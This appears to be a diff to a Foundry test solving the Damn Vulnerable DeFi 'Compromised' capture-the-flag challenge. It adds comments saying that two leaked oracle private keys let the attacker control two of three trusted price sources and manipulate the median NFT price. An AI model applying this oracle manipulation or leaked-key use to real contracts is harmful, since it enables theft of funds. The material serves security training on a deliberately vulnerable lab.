@@ -76,14 +76,14 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
-        console.log("Exchange balance before exploit: ", address(exchange).balance);
-
+        // The response from the server (in README.md) is the two following private keys encoded in Base64 with utf-8 encoding
         address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
         console.log("Oracle1 address: ", oracle1);
 
         address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
         console.log("Oracle2 address: ", oracle2);
 
+        // In order to manipulate median price we need to control two out of three trusted sources
         uint256 initialPrice = trustfulOracle.getMedianPrice("DVNFT");
 
         vm.prank(oracle1);
@@ -111,9 +111,6 @@ contract Compromised is Test {
 
         vm.prank(oracle2);
         trustfulOracle.postPrice("DVNFT", initialPrice);
-
-        console.log("Exchange balance after exploit: ", address(exchange).balance);
-
         /**
          * EXPLOIT END *
          */
